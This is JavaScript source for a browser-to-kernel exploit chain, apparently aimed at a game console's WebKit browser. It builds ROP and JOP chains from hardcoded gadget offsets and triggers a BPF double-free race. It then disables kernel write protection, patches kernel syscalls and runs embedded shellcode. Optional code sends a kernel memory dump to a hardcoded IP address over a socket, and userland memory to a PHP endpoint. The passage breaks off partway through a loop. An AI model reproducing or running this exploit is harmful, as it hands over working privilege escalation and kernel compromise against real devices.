var _dview;
function u2d(low, hi) {
 if (!_dview)
  _dview = new DataView(new ArrayBuffer(16));
 _dview.setUint32(0, hi);
 _dview.setUint32(4, low);
 return _dview.getFloat64(0);
}
function d2u(d) {
 if (!_dview)
  _dview = new DataView(new ArrayBuffer(16));
 _dview.setFloat64(0, d);
 return {
  low: _dview.getUint32(4),
  hi: _dview.getUint32(0)
 };
}
function makeid() {
 var text = "";
 var possible = "ABCDFGHIJKMNOPQRSTUVWXYZLEefulabcdghijkmnopqrstvwxyz0123456789";
 for (var i = 0; i < 8; i++)
  text += possible.charAt(Math.floor(Math.random() * possible.length));
 return text;
}
function zeroFill(number, width) {
 width -= number.toString().length;
 if (width > 0)
  return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
 return number + "";
}
function int64(low, hi) {
 this.low = (low >>> 0);
 this.hi = (hi >>> 0);
 this.add32inplace = function (val) {
  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo < this.low)
   new_hi++;
  this.hi = new_hi;
  this.low = new_lo;
 };
 this.add32 = function (val) {
  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo < this.low)
   new_hi++;
  return new int64(new_lo, new_hi);
 };
 this.sub32 = function (val) {
  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo > (this.low) & 0xFFFFFFFF)
   new_hi--;
  return new int64(new_lo, new_hi);
 };
 this.sub32inplace = function (val) {
  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo > (this.low) & 0xFFFFFFFF)
   new_hi--;
  this.hi = new_hi;
  this.low = new_lo;
 };
 this.and32 = function (val) {
  var new_lo = this.low & val;
  var new_hi = this.hi;
  return new int64(new_lo, new_hi);
 };
 this.and64 = function (vallo, valhi) {
  var new_lo = this.low & vallo;
  var new_hi = this.hi & valhi;
  return new int64(new_lo, new_hi);
 };
 this.toString = function (val) {
  val = 16;
  var lo_str = (this.low >>> 0).toString(val);
  var hi_str = (this.hi >>> 0).toString(val);
  if (this.hi == 0)
   return lo_str;
  else
   lo_str = zeroFill(lo_str, 8);
  return hi_str + lo_str;
 };
 this.toPacked = function () {
  return {
   hi: this.hi,
   low: this.low
  };
 };
 this.setPacked = function (pck) {
  this.hi = pck.hi;
  this.low = pck.low;
  return this;
 };
 return this;
}
var nogc = [];
failed = false;
var fail = function () {
 alert.apply(null, arguments);
 throw "fail";
};
function codeContenu(id) {
 var contenu = document.getElementById(id).value;
 return encodeURIComponent(contenu);
}
function createXHR() {
 var resultat = null;
 try {
  resultat = new XMLHttpRequest();
 } catch (Error) {
  try {
   resultat = new ActiveXObject("Msxml2.XMLHTTP");
  } catch (Error) {
   try {
    resultat = new ActiveXObject("Microsoft.XMLHTTP");
   } catch (Error) {
    resultat = null;
   }
  }
 }
 return resultat;
}
function supprimerContenu(element) {
 if (element != null) {
  while (element.firstChild)
   element.removeChild(element.firstChild);
 }
}
function remplacerContenu(id, texte) {
 var element = document.getElementById(id);
 if (element != null) {
  supprimerContenu(element);
  var nouveauContenu = document.createTextNode(texte);
  element.appendChild(nouveauContenu);
 }
}
window.syscalls = {};
window.syscallnames = {
 "sys_exit": 1,
 "sys_fork": 2,
 "sys_read": 3,
 "sys_write": 4,
 "sys_open": 5,
 "sys_close": 6,
 "sys_setuid": 23,
 "sys_getuid": 24,
 "sys_geteuid": 25,
 "sys_recvmsg": 27,
 "sys_sendmsg": 28,
 "sys_recvfrom": 29,
 "sys_accept": 30,
 "sys_getpeername": 31,
 "sys_getsockname": 32,
 "sys_getlogin": 49,
 "sys_setlogin": 50,
 "sys_sigaltstack": 53,
 "sys_ioctl": 54,
 "sys_munmap": 73,
 "sys_mprotect": 74,
 "sys_socket": 97,
 "sys_connect": 98,
 "sys_getpriority": 100,
 "sys_send": 101,
 "sys_recv": 102,
 "sys_bind": 104,
 "sys_setsockopt": 105,
 "sys_listen": 106,
 "sys_recvmsg": 113,
 "sys_sendmsg": 114,
 "sys_gettimeofday": 116,
 "sys_getrusage": 117,
 "sys_getsockopt": 118,
 "sys_readv": 120,
 "sys_writev": 121,
 "sys_settimeofday": 122,
 "sys_fchmod": 124,
 "sys_recvfrom": 125,
 "sys_setreuid": 126,
 "sys_setregid": 127,
 "sys_rename": 128,
 "sys_flock": 131,
 "sys_sendto": 133,
 "sys_shutdown": 134,
 "sys_socketpair": 135,
 "sys_mkdir": 136,
 "sys_rmdir": 137,
 "sys_utimes": 138,
 "sys_adjtime": 140,
 "sys_getpeername": 141,
 "sys_setsid": 147,
 "sys_sysarch": 165,
 "sys_setegid": 182,
 "sys_seteuid": 183,
 "sys_fstat": 189,
 "sys_lstat": 190,
 "sys_pathconf": 191,
 "sys_fpathconf": 192,
 "sys_getrlimit": 194,
 "sys_setrlimit": 195,
 "sys_getdirentries": 196,
 "sys___sysctl": 202,
 "sys_mlock": 203,
 "sys_munlock": 204,
 "sys_mlockall": 324,
 "sys_munlockall": 325,
 "sys_sched_setparam": 327,
 "sys_sched_getparam": 328,
 "sys_sched_setscheduler": 329,
 "sys_sched_getscheduler": 330,
 "sys_sched_yield": 331,
 "sys_sched_get_priority_max": 332,
 "sys_sched_get_priority_min": 333,
 "sys_sched_rr_get_interval": 334,
 "sys_utrace": 335,
 "sys_sigprocmask": 340,
 "sys_sigprocmask": 340,
 "sys_sigsuspend": 341,
 "sys_sigpending": 343,
 "sys_sigtimedwait": 345,
 "sys_sigwaitinfo": 346,
 "sys_kqueue": 362,
 "sys_kevent": 363,
 "sys_getcontext": 421,
 "sys_mmap": 477,
 "sys_namedobj_create": 557,
 "sys_namedobj_delete": 558,
 "sys_mdbg_call": 573,
 "sys_mdbg_service": 601,
 "sys_randomized_path": 602,
};
function swapkeyval(json) {
 var ret = {};
 for (var key in json) {
  if (json.hasOwnProperty(key))
   ret[json[key]] = key;
 }
 return ret;
}
window.nameforsyscall = swapkeyval(window.syscallnames);
window.memory = function (address) {
 this.basePtr = address;
 this.dataPtr = 0;
 this.allocate = function (size) {
  if (this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000)
   return -1;
  var memAddr = this.basePtr.add32(this.dataPtr);
  this.dataPtr += size;
  return memAddr;
 };
 this.clear = function () {
  for (var i = 0; i < 0x10000; i += 8)
   p.write8(this.basePtr.add32(i), 0);
 };
 this.clear();
 return this;
};
window.kropchain = function (addr) {
 this.stackBase = addr;
 this.count = 0;
 this.push = function (val) {
  p.write8(this.stackBase.add32(this.count * 8), val);
  this.count++;
 };
 this.write64 = function (address, value) {
  this.push(gadgets["pop rdi"]);
  this.push(address);
  this.push(gadgets["pop rax"]);
  this.push(value);
  this.push(gadgets["mov [rdi], rax"]);
 };
 return this;
};
window.rop = function () {
 this.stack = new Uint32Array(0x4000);
 this.stackBase = p.read8(p.leakval(this.stack).add32(0x10));
 this.count = 0;
 this.clear = function () {
  this.count = 0;
  this.runtime = undefined;
  for (var i = 0; i < (0x4000 / 4) / 8; i++)
   p.write8(this.stackBase.add32(i * 8), 0);
 };
 this.pushSymbolic = function () {
  this.count++;
  return this.count - 1;
 };
 this.finalizeSymbolic = function (idx, val) {
  p.write8(this.stackBase.add32(idx * 8), val);
 };
 this.push = function (val) {
  this.finalizeSymbolic(this.pushSymbolic(), val);
 };
 this.push_write8 = function (where, what) {
  this.push(gadgets["pop rdi"]);
  this.push(where);
  this.push(gadgets["pop rsi"]);
  this.push(what);
  this.push(gadgets["mov [rdi], rsi"]);
 };
 this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
  if (rdi != undefined) {
   this.push(gadgets["pop rdi"]);
   this.push(rdi);
  }
  if (rsi != undefined) {
   this.push(gadgets["pop rsi"]);
   this.push(rsi);
  }
  if (rdx != undefined) {
   this.push(gadgets["pop rdx"]);
   this.push(rdx);
  }
  if (rcx != undefined) {
   this.push(gadgets["pop rcx"]);
   this.push(rcx);
  }
  if (r8 != undefined) {
   this.push(gadgets["pop r8"]);
   this.push(r8);
  }
  if (r9 != undefined) {
   this.push(gadgets["pop r9"]);
   this.push(r9);
  }
  this.push(rip);
  return this;
 };
 this.saveReturnValue = function (where) {
  this.push(gadgets["pop rdi"]);
  this.push(where);
  this.push(gadgets["mov [rdi], rax"]);
 };
 this.run = function () {
  var retv = p.loadchain(this);
  this.clear();
  return retv;
 };
 return this;
};
kernel_offsets = {
 "jmp [rsi]": 0x00093385,
 "kqueue_close_slide": 0x0016D872,
 "cpu_setregs": 0x00233020,
 "mov cr0, rax": 0x00233029,
 "sys_setuid_patch_offset": 0x00054A72,
 "sys_mmap_patch_offset": 0x0013D620,
 "vm_map_protect_patch_offset": 0x001A3C06,
 "amd64_syscall_patch_offset": 0x000004B1,
 "sys_dynlib_dlsym_patch_offset": 0x002B2620,
 "syscall_11_patch1_offset": 0x0107C820,
 "syscall_11_patch2_offset": 0x0107C828,
 "syscall_11_patch3_offset": 0x0107C848,
};
kernel_patches = {
 "sys_setuid_patch_1": 0x000000B8,
 "sys_setuid_patch_2": 0xC4894100,
 "sys_mmap_patch_1": 0x37B64037,
 "sys_mmap_patch_2": 0x3145C031,
 "vm_map_protect_patch_1": 0x9090FA38,
 "vm_map_protect_patch_2": 0x90909090,
 "amd64_syscall_patch_1": 0x90907DEB,
 "amd64_syscall_patch_2": 0x72909090,
 "sys_dynlib_dlsym_patch_1": 0x90C3C031,
 "sys_dynlib_dlsym_patch_2": 0x90909090,
};
window.kernel_offsets = kernel_offsets;
window.kernel_patches = kernel_patches;
function kernExploit_bpf_double_free() {
 var kernel_dump_size = 0x69B8000;
 var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
 if (fd == (-1 >>> 0))
  throw "Failed to open first /dev/bpf0 device!";
 var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
 if (fd1 < 0)
  throw "Failed to open second /dev/bpf0 device!";
 var bpf_valid_instructions = p.malloc32(0x4000);
 var bpf_valid_u32 = bpf_valid_instructions.backing;
 for (var i = 0; i < 0x400; ) {
  bpf_valid_u32[i++] = 6;
  bpf_valid_u32[i++] = 0;
 }
 var bpf_valid_prog = p.malloc(0x40);
 p.write8(bpf_valid_prog.add32(0x00), 0x800 / 8);
 p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);
 var bpf_spray_instructions = p.malloc32(0x4000);
 var bpf_spray_prog = p.malloc(0x40);
 p.write8(bpf_spray_prog.add32(0x00), 0x800 / 8);
 p.write8(bpf_spray_prog.add32(0x08), bpf_spray_instructions);
 if (p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog).low != 0)
  throw "Failed to open bpf device!";
 var krop = new rop();
 var kscratch = p.malloc32(0x1000);
 var ctxp = p.malloc32(0x1000);
 var ctxp1 = p.malloc32(0x1000);
 var ctxp2 = p.malloc32(0x1000);
 var kpatch = function (dest_offset, patch_data_qword) {
  krop.push(window.gadgets["pop rax"]);
  krop.push(dest_offset);
  krop.push(window.gadgets["pop rdi"]);
  krop.push(kscratch);
  krop.push(window.gadgets["add rax, [rdi]"]);
  krop.push(window.gadgets["mov rdx, rax"]);
  krop.push(window.gadgets["pop rax"]);
  krop.push(patch_data_qword);
  krop.push(window.gadgets["mov [rdx], rax"]);
 };
 var kpatch2 = function (dest_offset, src_offset) {
  krop.push(window.gadgets["pop rax"]);
  krop.push(kscratch);
  krop.push(window.gadgets["mov rax, [rax]"]);
  krop.push(window.gadgets["pop rcx"]);
  krop.push(dest_offset);
  krop.push(window.gadgets["add rax, rcx"]);
  krop.push(window.gadgets["mov rdx, rax"]);
  krop.push(window.gadgets["pop rax"]);
  krop.push(kscratch);
  krop.push(window.gadgets["mov rax, [rax]"]);
  krop.push(window.gadgets["pop rcx"]);
  krop.push(src_offset);
  krop.push(window.gadgets["add rax, rcx"]);
  krop.push(window.gadgets["mov [rdx], rax"]);
 };
 var disable_kernel_write_protection = function () {
  krop.push(window.gadgets["pop rax"]);
  krop.push(kscratch);
  krop.push(window.gadgets["mov rax, [rax]"]);
  krop.push(window.gadgets["pop rcx"]);
  krop.push(window.kernel_offsets["mov cr0, rax"]);
  krop.push(window.gadgets["add rax, rcx"]);
  krop.push(window.gadgets["mov rdx, rax"]);
  krop.push(window.gadgets["pop rax"]);
  krop.push(0x80040033);
  krop.push(window.gadgets["jmp rdx"]);
 };
 var stackshift_from_retaddr = 0;
 p.write8(bpf_spray_instructions.add32(0x10), ctxp);
 p.write8(ctxp.add32(0x50), 0);
 p.write8(ctxp.add32(0x68), ctxp1);
 p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]);
 stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
 p.write8(ctxp.add32(0x00), ctxp2);
 p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));
 p.write8(ctxp2.add32(window.gadgets_shift["jump_shift_jop1"]), window.gadgets["jop2"]);
 var iterbase = ctxp2;
 for (var i = 0; i < 0x1C; i++) {
  p.write8(iterbase, window.gadgets["jop1"]);
  stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
  p.write8(iterbase.add32(window.gadgets_shift["jump_shift_jop1"] + 0x20), window.gadgets["jop2"]);
  p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
  p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
  iterbase = iterbase.add32(0x20);
 }
 var raxbase = iterbase;
 var rdibase = iterbase.add32(0x08);
 var memcpy = p.read8(window.get_jmptgt(window.gadgets["memcpy"]));
 p.write8(raxbase, window.gadgets["jop3"]);
 stackshift_from_retaddr += 0x8;
 p.write8(rdibase.add32(0x70), window.gadgets["jop4"]);
 stackshift_from_retaddr += 0x8;
 p.write8(rdibase.add32(0x18), rdibase);
 p.write8(rdibase.add32(0x08), krop.stackBase);
 p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]);
 p.write8(rdibase, raxbase);
 p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop5"]), window.gadgets["jop6"]);
 stackshift_from_retaddr += window.gadgets_shift["stackshift_jop6"];
 var topofchain = stackshift_from_retaddr;
 p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop6"]), memcpy.add32(0xC2 - 0x90));
 p.write8(rdibase.add32(0xB0), topofchain);
 for (var i = 0; i < 0x1000 / 8; i++)
  p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
 krop.count = 0x10;
 p.write8(kscratch.add32(window.gadgets_shift["jump_shift_jop5"]), window.gadgets["pop rdi"]);
 p.write8(kscratch.add32(window.gadgets_shift["jump_shift_jop6"]), window.gadgets["pop rax"]);
 p.write8(kscratch.add32(0x18), kscratch);
 krop.push(window.gadgets["pop rdi"]);
 krop.push(kscratch.add32(0x18));
 krop.push(window.gadgets["jop_mov rbp, rsp"]);
 var rboff = topofchain - krop.count * 8;
 krop.push(window.gadgets["jop6"]);
 rboff += window.gadgets_shift["stackshift_jop6"];
 krop.push(window.gadgets["pop rax"]);
 krop.push(rboff);
 krop.push(window.gadgets["add rdi, rax; mov rax, rdi"]);
 krop.push(window.gadgets["mov rax, [rdi]"]);
 krop.push(window.gadgets["pop rcx"]);
 krop.push(window.kernel_offsets["kqueue_close_slide"]);
 krop.push(window.gadgets["sub rax, rcx"]);
 krop.push(window.gadgets["mov rdx, rax"]);
 krop.push(window.gadgets["pop rsi"]);
 krop.push(kscratch);
 krop.push(window.gadgets["mov [rsi], rdx"]);
 krop.push(window.gadgets["pop rax"]);
 krop.push(window.gadgets["add rsp, 0x28"]);
 krop.push(window.gadgets["mov [rdi], rax"]);
 if (dump_kernel) {
  krop.push(window.gadgets["pop rdx"]);
  krop.push(kernel_dump_size);
  krop.push(window.gadgets["pop rax"]);
  krop.push(kscratch);
  krop.push(window.gadgets["mov rax, [rax]"]);
  krop.push(window.gadgets["pop rdi"]);
  krop.push(0);
  krop.push(window.gadgets["add rdi, rax; mov rax, rdi"]);
  krop.push(window.gadgets["pop rcx"]);
  krop.push(window.gadgets["ret"]);
  krop.push(window.gadgets["mov rsi, rax; jmp rcx"]);
  var kernelBuf = p.malloc(kernel_dump_size);
  krop.push(window.gadgets["pop rdi"]);
  krop.push(kernelBuf);
  krop.push(memcpy);
 } else {
  disable_kernel_write_protection();
  kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
  kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
  kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
  kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
  kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
  kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
  kpatch(window.kernel_offsets["amd64_syscall_patch_offset"], new int64(window.kernel_patches["amd64_syscall_patch_1"], window.kernel_patches["amd64_syscall_patch_2"]));
  kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch_1"], window.kernel_patches["sys_dynlib_dlsym_patch_2"]));
  krop.push(window.gadgets["pop rax"]);
  krop.push(kscratch);
  krop.push(window.gadgets["mov rax, [rax]"]);
  krop.push(window.gadgets["pop rcx"]);
  krop.push(window.kernel_offsets["cpu_setregs"]);
  krop.push(window.gadgets["add rax, rcx"]);
  krop.push(window.gadgets["jmp rax"]);
 }
 krop.push(window.gadgets["ret2userland"]);
 krop.push(kscratch.add32(0x1000));
 var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
 var shellbuf = p.malloc32(0x1000);
 for (var i = 0; i < shcode.length; i++)
  shellbuf.backing[i] = shcode[i];
 var interrupt,
 loop;
 window.spawnthread(function (thread) {
  interrupt = thread.stackBase;
  thread.push(window.gadgets["ret"]);
  thread.push(window.gadgets["ret"]);
  thread.push(window.gadgets["ret"]);
  thread.push(window.gadgets["pop rdi"]);
  thread.push(fd);
  thread.push(window.gadgets["pop rsi"]);
  thread.push(0x8010427B);
  thread.push(window.gadgets["pop rdx"]);
  thread.push(bpf_valid_prog);
  thread.push(window.gadgets["pop rsp"]);
  thread.push(thread.stackBase.add32(0x800));
  thread.count = 0x800 / 8;
  var cntr = thread.count;
  thread.push(window.syscalls[54]);
  thread.push_write8(thread.stackBase.add32(cntr * 8), window.syscalls[54]);
  thread.push(window.gadgets["pop rdi"]);
  var wherep = thread.pushSymbolic();
  thread.push(window.gadgets["pop rsi"]);
  var whatp = thread.pushSymbolic();
  thread.push(window.gadgets["mov [rdi], rsi"]);
  thread.push(window.gadgets["pop rsp"]);
  loop = thread.stackBase.add32(thread.count * 8);
  thread.push(0x41414141);
  thread.finalizeSymbolic(wherep, loop);
  thread.finalizeSymbolic(whatp, loop.sub32(8));
 });
 var race = new rop();
 var kq = p.malloc32(0x10);
 var kev = p.malloc32(0x100);
 kev.backing[0] = p.syscall("sys_socket", 2, 2);
 kev.backing[2] = 0x1ffff;
 kev.backing[3] = 1;
 kev.backing[4] = 5;
 while (1) {
  race.count = 0;
  race.push(window.syscalls[362]);
  race.push(window.gadgets["pop rdi"]);
  race.push(kq);
  race.push(window.gadgets["mov [rdi], rax"]);
  race.push(window.gadgets["ret"]);
  race.push(window.gadgets["ret"]);
  race.push(window.gadgets["ret"]);
  race.push(window.gadgets["ret"]);
  race.push_write8(loop, interrupt);
  race.push(window.gadgets["pop rdi"]);
  race.push(fd);
  race.push(window.gadgets["pop rsi"]);
  race.push(0x8010427B);
  race.push(window.gadgets["pop rdx"]);
  race.push(bpf_valid_prog);
  race.push(window.syscalls[54]);
  race.push(window.gadgets["pop rdi"]);
  race.push(kq.sub32(0x48));
  race.push(window.gadgets["mov rdi, [rdi+0x48]"]);
  race.push(window.gadgets["pop rsi"]);
  race.push(kev);
  race.push(window.gadgets["pop rdx"]);
  race.push(1);
  race.push(window.gadgets["pop rcx"]);
  race.push(0);
  race.push(window.gadgets["pop r8"]);
  race.push(0);
  race.push(window.syscalls[363]);
  race.push(window.gadgets["pop rdi"]);
  race.push(fd1);
  race.push(window.gadgets["pop rsi"]);
  race.push(0x8010427B);
  race.push(window.gadgets["pop rdx"]);
  race.push(bpf_spray_prog);
  race.push(window.syscalls[54]);
  race.push(window.gadgets["pop rdi"]);
  race.push(kq.sub32(0x48));
  race.push(window.gadgets["mov rdi, [rdi+0x48]"]);
  race.push(window.syscalls[6]);
  race.run();
  if (kscratch.backing[0] != 0) {
   if (dump_kernel) {
    alert("Kernel base:" + p.read8(kscratch));
    var s = p.socket();
    alert("After pressing OK, please launch socket listen.");
    p.connectSocket(s, socket_ip_pc, socket_port_send);
    alert("Starting kernel dumping to socket. Accept to continue.");
    p.writeSocket(s, kernelBuf, kernel_dump_size);
    alert("Kernel has theoritically been dumped on your target IP.");
    p.closeSocket(s);
   } else {
    p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
    p.fcall(shellbuf);
   }
   break;
  }
 }
 return true;
}
var p;
var gadgets;
var socket_ip_pc = '192.168.0.40';
var socket_port_send = 9030;
var dump_userland = 0;
var dump_kernel = 0;
var getKernelBaseOnly = 0;
window.is_devkit = false;
window.resolve_webkit_offsets = function () {
 gadgetcache = {
  "ret": 0x0000003C,
  "jmp rax": 0x00000082,
  "ep": 0x000000AD,
  "pop rbp": 0x000000B6,
  "mov [rdi], rax": 0x003ADAEB,
  "pop r8": 0x000179C5,
  "pop rax": 0x000043F5,
  "mov rax, rdi": 0x000058D0,
  "mov rax, [rax]": 0x0006C83A,
  "pop rsi": 0x0008F38A,
  "pop rdi": 0x00038DBA,
  "pop rcx": 0x00052E59,
  "pop rsp": 0x0001E687,
  "mov [rdi], rsi": 0x00023AC2,
  "pop rdx": 0x001BE024,
  "pop r9": 0x00BB320F,
  "jop": 0x000C37D0,
  "infloop": 0x01545EAA,
  "mov [rdx], rax": 0x001F149B,
  "add rax, rcx": 0x000156DB,
  "mov rdx, rax": 0x00353B31,
  "mov rax, rdx": 0x001CEF20,
  "mov rax, [rdi]": 0x00046EF9,
  "jmp rdx": 0x0000E3D0,
  "ret2userland": 0x0005CDB9,
  "add rsp, 0x28": 0x00004C2E,
  "mov [rsi], rdx": 0x00A6450A,
  "add rdi, rax; mov rax, rdi": 0x005557DF,
  "mov rsi, rax; jmp rcx": 0x0000DEE0,
  "jop1": 0x012A19CD,
  "jop2": 0x006EF4E5,
  "jop3": 0x015CA41B,
  "jop4": 0x01284834,
  "jop_mov rbp, rsp": 0x000F094A,
  "jop6": 0x00272961,
  "longjmp": 0x000014E8,
  "createThread": 0x00779390,
 };
 gadgetshiftcache = {
  "stackshift_jop1": 0x00000058,
  "stackshift_jop6": 0x00000028,
  "jump_shift_jop1": 0x000007D0,
  "jump_shift_jop5": 0x00000420,
  "jump_shift_jop6": 0x00000040,
 };
 window.gadgetcache = gadgetcache;
 window.gadgets_shift = gadgetshiftcache;
};
window.stage2 = function () {
 try {
  stage2_();
 } catch (e) {
  alert(e);
 }
};
function stage2_() {
 p = window.prim;
 p.read2 = function (addr) {
  return p.read4(addr) & 0xFFFF;
 };
 p.read1 = function (addr) {
  return p.read4(addr) & 0xFF;
 };
 p.read_data8 = function (addr, size) {
  var v = new Uint8Array(size);
  for (var i = 0; i < size; i++)
   v[i] = p.read1(addr + i);
  return v;
 };
 p.writestr = function (addr, str) {
  for (var i = 0; i < str.length; i++) {
   var byte_ = p.read4(addr.add32(i));
   byte_ &= 0xFFFF0000;
   byte_ |= str.charCodeAt(i);
   p.write4(addr.add32(i), byte_);
  }
 };
 p.readstr = function (addr) {
  var addr_ = addr.add32(0);
  var rd = p.read4(addr_);
  var buf = "";
  while (rd & 0xFF) {
   buf += String.fromCharCode(rd & 0xFF);
   addr_.add32inplace(1);
   rd = p.read4(addr_);
  }
  return buf;
 };
 p.array_to_string = function (array) {
  var str = "";
  for (var i = 0; i < array.length; i++)
   str += String.fromCharCode(array[i]);
  return str;
 };
 p.stringify = function (str) {
  var bufView = new Uint8Array(str.length + 1);
  for (var i = 0; i < str.length; i++)
   bufView[i] = str.charCodeAt(i) & 0xFF;
  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
 };
 p.malloc = function malloc(sz) {
  var backing = new Uint8Array(0x10000 + sz);
  window.nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;
  return ptr;
 };
 p.malloc32 = function malloc32(sz) {
  var backing = new Uint8Array(0x10000 + sz * 4);
  window.nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);
  return ptr;
 };
 window.get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25FF)
   return 0;
  return addr.add32(y + 6);
 };
 window.hexdump_8 = function (address, length) {
  var str = "";
  for (var i = 0; i < length; i++) {
   var r = p.read8(address.add32(i));
   var tmp = r.toString();
   for (var y = 16; tmp.length < 16; y--)
    tmp = "0" + tmp;
   str += " " + tmp;
   i += 7;
  }
  return str;
 };
 window.dump_memory = function (filename, addr, size) {
  var tmp_buf = new Uint32Array(size);
  for (i = 0; i < size; i++)
   tmp_buf[i] = p.read4(addr.add32(i * 4));
  objectXHR = createXHR();
  objectXHR.open("POST", "dumpFileMem.php?filename=" + filename, false);
  objectXHR.setRequestHeader('Content-type', 'application/octet-stream');
  objectXHR.onreadystatechange = done;
  function done() {
   if (objectXHR.readyState == 4) {
    if (objectXHR.status == 200) {}
    else {
     alert("Error XHR: " + objectXHR.status + " – " + objectXHR.statusText);
     objectXHR.abort();
     objectXHR = null;
    }
   }
  }
  objectXHR.send(tmp_buf);
 };
 var leakfunc_slide = 0;
 leakfunc_slide = 0x40;
 p.leakfunc = function (func) {
  var fptr_store = p.leakval(func);
  return (p.read8(fptr_store.add32(0x18))).add32(leakfunc_slide);
 };
 var parseFloatStore = p.leakfunc(parseFloat);
 var parseFloatPtr = p.read8(parseFloatStore);
 var webKitBase = parseFloatPtr;
 webKitBase.sub32inplace(0x578540);
 if (p.read8(webKitBase) != 56415741E5894855)
  alert("Bad webKitBase: " + webKitBase);
 window.webKitBase = webKitBase;
 var o2wk = function (o) {
  return webKitBase.add32(o);
 };
 window.o2wk = o2wk;
 if (dump_userland) {
  alert("Starting dumping libwebkit");
  for (i = 0; i < 0x10000000 / 0x1000; i++)
   dump_memory("", window.webKitBase.add32(i * 0x1000), 0x1000);
  alert("Dump finished");
 }
 gadgets_temp = {
  "__stack_chk_fail": o2wk(0xC8),
  "__stack_chk_fail_libkernel": 0x11EC0,
  "memset": o2wk(0x228),
  "memset_libc": 0x225E0,
 };
 var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets_temp.memset));
 libSceLibcInternalBase.sub32inplace(gadgets_temp.memset_libc);
 if (p.read8(libSceLibcInternalBase) != 56415741E5894855)
  alert("Bad libSceLibcInternalBase: " + libSceLibcInternalBase);
 window.libSceLibcInternalBase = libSceLibcInternalBase;
 var o2lc = function (o) {
  return libSceLibcInternalBase.add32(o);
 };
 window.o2lc = o2lc;
 var libKernelBase = p.read8(get_jmptgt(gadgets_temp.__stack_chk_fail));
 libKernelBase.sub32inplace(gadgets_temp.__stack_chk_fail_libkernel);
 if (p.read8(libKernelBase) != 56415741E5894855)
  alert("Bad libKernelBase: " + libKernelBase);
 window.libKernelBase = libKernelBase;
 var o2lk = function (o) {
  return libKernelBase.add32(o);
 };
 window.o2lk = o2lk;
 gadgets = {
  "memcpy": o2wk(0xF8),
  "memcmp": o2wk(0x208),
  "memset": o2wk(0x228),
  "setjmp": o2wk(0x14F8),
  "scePthreadCreate": o2lk(0x98C0),
  "scePthreadJoin": o2lk(0xE0C0),
  "mov rdi, [rdi+0x48]": o2lc(0xB00F2),
  "sub rax, rcx": o2lk(0x1EADB),
  "add rax, [rdi]": o2lc(0x44DB8),
 };
 window.resolve_webkit_offsets();
 if (window.gadgetcache) {
  for (var gadgetname in window.gadgetcache) {
   if (window.gadgetcache.hasOwnProperty(gadgetname))
    gadgets[gadgetname] = o2wk(window.gadgetcache[gadgetname]);
  }
 } else
  alert("no gadgetcache !!!");
 var hold1;
 var hold2;
 var holdz;
 var holdz1;
 while (1) {
  hold1 = {
   a: 0,
   b: 0,
   c: 0,
   d: 0
  };
